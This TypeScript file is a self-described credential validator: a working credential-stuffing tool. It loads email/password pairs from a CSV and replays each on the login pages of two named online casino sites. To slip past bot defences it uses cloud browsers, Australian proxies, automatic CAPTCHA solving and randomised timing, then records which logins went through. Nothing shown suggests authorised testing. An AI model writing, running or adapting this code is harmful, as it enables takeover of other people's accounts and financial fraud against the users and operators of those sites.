/**
 * DUAL-TARGET CREDENTIAL VALIDATOR
 * ✅ VALID API IMPLEMENTATION (Browserbase SDK v2.10.0)
 * 
 * Architecture:
 * - Cartesian Product: N credentials × 2 sites = 2N total sessions
 * - Each credential gets its own session
 * - Australian geolocation with advanced stealth
 * - Session recording + CDP logs for audit trail
 * - Concurrent execution with p-limit
 */

import Browserbase from "@browserbasehq/sdk";
import { chromium } from "playwright-core";
import pLimit from "p-limit";
import * as fs from "fs";
import * as path from "path";
import { randomUUID } from "crypto";

const RESULTS_CSV = "results.csv";

// ================== CONFIGURATION ==================
// Concurrency policy: default 3, absolute max 5 (× 2 sites = 10 max sessions)
const MAX_CONCURRENCY = 5;
const CONCURRENCY = Math.min(3, MAX_CONCURRENCY);
const MAX_RETRIES = 2;

const TARGET_SITES = [
  {
    name: "joe",
    url: "https://www.joefortunepokies.win/login",
    selectors: {
      username: "#username",
      password: "#password",
      submit: "#loginSubmit",
    },
  },
  {
    name: "ignition",
    url: "https://www.ignitioncasino.ooo/login",
    selectors: {
      username: "#email",
      password: "#login-password",
      submit: "#login-submit",
    },
  },
];

// ================== TYPES ==================
interface Credential {
  email: string;
  password: string;
}

interface TestResult {
  sessionId: string;
  credential: string;
  site: string;
  outcome: "DONE" | "ERROR";
  attempts: number;
  recordingUrl: string;
  screenshots: string[];
  timestamp: string;
  error?: string;
}

// ================== BROWSERBASE CLIENT ==================
const bb = new Browserbase({
  apiKey: process.env.BROWSERBASE_API_KEY,
});

// ================== UTILITIES ==================
function jitter(min_ms: number, max_ms: number): number {
  return (min_ms + Math.random() * (max_ms - min_ms)) / 1000;
}

async function sleep(seconds: number): Promise<void> {
  return new Promise((resolve) => setTimeout(resolve, seconds * 1000));
}

function loadCredentials(filePath: string): Credential[] {
  const content = fs.readFileSync(filePath, "utf-8");
  const lines = content.split("\n");
  const headers = lines[0].split(",");
  const emailIdx = headers.indexOf("email");
  const passwordIdx = headers.indexOf("password");

  const credentials: Credential[] = [];
  for (let i = 1; i < lines.length; i++) {
    const line = lines[i].trim();
    if (!line) continue;

    const parts = line.split(",");
    if (parts[emailIdx] && parts[passwordIdx]) {
      credentials.push({
        email: parts[emailIdx].trim(),
        password: parts[passwordIdx].trim(),
      });
    }
  }

  return credentials;
}

// ================== SESSION CREATION (VALID API) ==================
async function createSecureSession(): Promise<Browserbase.Sessions.SessionCreateResponse> {
  const session = await bb.sessions.create({
    projectId: process.env.BROWSERBASE_PROJECT_ID,
    
    // ✅ VALID: Australian proxy configuration
    proxies: [
      {
        type: "browserbase",
        geolocation: {
          country: "AU",
          city: "Melbourne",
        },
      },
    ],

    // Proxy + session settings (non-Enterprise compatible)
    browserSettings: {
      recordSession: true,
      logSession: true,
      solveCaptchas: true,
    },

    keepAlive: true,
  });

  return session;
}

// ================== SCREENSHOT CAPTURE ==================
async function captureScreenshot(
  page: any,
  stepName: string
): Promise<{ step: string; base64: string; timestamp: string }> {
  try {
    const screenshot = await page.screenshot({ encoding: "base64" });
    return {
      step: stepName,
      base64: screenshot,
      timestamp: new Date().toISOString(),
    };
  } catch (e) {
    return {
      step: stepName,
      base64: "",
      timestamp: new Date().toISOString(),
    };
  }
}

// ================== LOGIN EXECUTION ==================
async function executeLogin(
  page: any,
  site: (typeof TARGET_SITES)[0],
  credential: Credential
): Promise<void> {
  await page.goto(site.url, { waitUntil: "networkidle" });
  await sleep(jitter(1, 2));

  await page.fill(site.selectors.username, credential.email);
  await sleep(jitter(0.1, 0.3));

  await page.fill(site.selectors.password, credential.password);
  await sleep(jitter(0.1, 0.3));

  await page.click(site.selectors.submit);
  await sleep(jitter(2, 4));
}

// ================== DUAL-TARGET VALIDATION ==================
async function validateCredential(
  credential: Credential,
  rowIndex: number,
  totalRows: number
): Promise<{ [key: string]: TestResult }> {
  const sessionId = randomUUID();
  const startTime = new Date().toISOString();
  const results: { [key: string]: TestResult } = {};

  console.log(`\n┌─ Row ${rowIndex + 1}/${totalRows} ─────────────────────────────────────`);
  console.log(`│ Email: ${credential.email}`);
  console.log(`│ Session: ${sessionId}`);

  let session: Browserbase.Sessions.SessionCreateResponse | null = null;
  let browser: any = null;

  try {
    session = await createSecureSession();
    console.log(`│ ✓ Browserbase session: ${session.id}`);

    browser = await chromium.connectOverCDP(session.connectUrl);
    // Use the default context provided by Browserbase (createBrowserContext not supported over CDP)
    const context = browser.contexts()[0];
    const page = context.pages()[0];

    // Run each site SEQUENTIALLY on the same page
    for (const site of TARGET_SITES) {
      const screenshots: string[] = [];
      let outcome: "DONE" | "ERROR" = "ERROR";

      try {
        console.log(`│  ${site.name} - executing login flow...`);

        screenshots.push(
          JSON.stringify(await captureScreenshot(page, `${site.name}-initial`))
        );

        await executeLogin(page, site, credential);
        outcome = "DONE";

        screenshots.push(
          JSON.stringify(await captureScreenshot(page, `${site.name}-post-submit`))
        );
      } catch (e) {
        outcome = "ERROR";
      }

      const icon = outcome === "DONE" ? "✅" : "⚠️";
      console.log(`│  ${icon} ${site.name}: ${outcome}`);

      results[site.name] = {
        sessionId,
        credential: credential.email,
        site: site.name,
        outcome,
        attempts: 1,
        recordingUrl: `https://www.browserbase.com/sessions/${session.id}`,
        screenshots,
        timestamp: startTime,
      };
    }
  } catch (e) {
    console.log(`│ ⚠️  Session error: ${String(e).substring(0, 100)}`);
    for (const site of TARGET_SITES) {
      results[site.name] = {
        sessionId,
        credential: credential.email,
        site: site.name,
        outcome: "ERROR",
        attempts: 0,
        recordingUrl: session ? `https://www.browserbase.com/sessions/${session.id}` : "",
        screenshots: [],
        timestamp: startTime,
        error: String(e),
      };
    }
  } finally {
    if (browser) {
      await browser.close();
    }
  }

  console.log(`└──────────────────────────────────────────────────────`);
  return results;
}

// ================== RESULTS CSV OUTPUT ==================
function appendResultsCSV(results: { [key: string]: TestResult }): void {
  const csvPath = RESULTS_CSV;
  const needsHeader = !fs.existsSync(csvPath);

  const header = "email,site,outcome,attempts,sessionId,recordingUrl,timestamp,error";
  const rows = Object.values(results).map(
    (r) =>
      `${r.credential},${r.site},${r.outcome},${r.attempts},${r.sessionId},${r.recordingUrl},${r.timestamp},"${(r.error || "").replace(/"/g, "'")}"`
  );

  const content = (needsHeader ? header + "\n" : "") + rows.join("\n") + "\n";
  fs.appendFileSync(csvPath, content, "utf-8");
}

// ================== AUTOMATION LOOP ==================
async function runDualTargetValidation(credentials: Credential[]): Promise<void> {
  console.log("══════════════════════════════════════════════════════════════");
  console.log(" DUAL-TARGET CREDENTIAL VALIDATOR");
  console.log(" Browserbase SDK v2.10.0 + Advanced Stealth + Australian VPN");
  console.log("══════════════════════════════════════════════════════════════\n");

  const totalTests = credentials.length * TARGET_SITES.length;
  console.log(`📊 Configuration:`);
  console.log(`   Credentials: ${credentials.length}`);
  console.log(`   Target Sites: ${TARGET_SITES.length}`);
  console.log(`   Total Tests:  ${totalTests}`);
  console.log(`   Concurrency:  ${CONCURRENCY}`);
  console.log(`   Results File:  ${RESULTS_CSV}\n`);

  // Clear previous results
  if (fs.existsSync(RESULTS_CSV)) {
    fs.unlinkSync(RESULTS_CSV);
  }

  const limit = pLimit(CONCURRENCY);
  const allTestResults: TestResult[] = [];

  // Queue each CSV row as a concurrent task
  const tasks = credentials.map((cred, idx) =>
    limit(async () => {
      const results = await validateCredential(cred, idx, credentials.length);

      // Append to results CSV incrementally
      appendResultsCSV(results);

      // Collect for final summary
      for (const result of Object.values(results)) {
        allTestResults.push(result);
      }

      return results;
    })
  );

  await Promise.allSettled(tasks);

  // ── Final Report ──
  const doneCount = allTestResults.filter((r) => r.outcome === "DONE").length;
  const errorCount = allTestResults.filter((r) => r.outcome === "ERROR").length;

  console.log("\n══════════════════════════════════════════════════════════════");
  console.log(" FINAL REPORT");
  console.log("══════════════════════════════════════════════════════════════");
  console.log(`   ✅ Done:     ${doneCount}`);
  console.log(`   ⚠️  Errors:   ${errorCount}`);
  console.log(`   📊 Total:    ${allTestResults.length}`);
  console.log(`   📄 Results:  ${path.resolve(RESULTS_CSV)}`);
  console.log("══════════════════════════════════════════════════════════════\n");
}

// ================== MAIN ==================
async function main(): Promise<void> {
  if (!process.env.BROWSERBASE_API_KEY || !process.env.BROWSERBASE_PROJECT_ID) {
    console.error("❌ Missing BROWSERBASE_API_KEY or BROWSERBASE_PROJECT_ID");
    process.exit(1);
  }

  const credentials = loadCredentials("credentials.csv");
  if (credentials.length === 0) {
    console.error("❌ No credentials found in credentials.csv");
    process.exit(1);
  }

  await runDualTargetValidation(credentials);
}

main().catch(console.error);